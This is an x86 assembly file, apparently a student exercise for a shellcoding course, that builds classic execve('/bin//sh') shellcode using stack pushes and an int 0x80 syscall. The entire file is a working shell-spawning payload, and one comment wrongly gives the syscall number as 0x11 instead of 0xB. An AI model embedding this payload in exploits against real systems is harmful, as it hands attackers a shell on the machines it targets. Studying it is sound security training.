; shellcode.asm
; Author : Joris Hartog
; Date   : 21-11-2015
; Student: SLAE-704

global _start

section .text

_start:
	
	; syscall: #define __NR_execve              11
	; int execve(	const char *filename, 
	;		char *const argv[],
        ;		char *const envp[]);
	; eax := 0x11
	; *ebx := "/bin//sh"
	; *ecx := ebx, 0x00000000
	; *edx := 0x00000000
	
	xor eax, eax
	push eax
	mov edx, esp

	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	push eax
	push ebx
	mov ecx, esp

	mov al, 0xB
	int 0x80

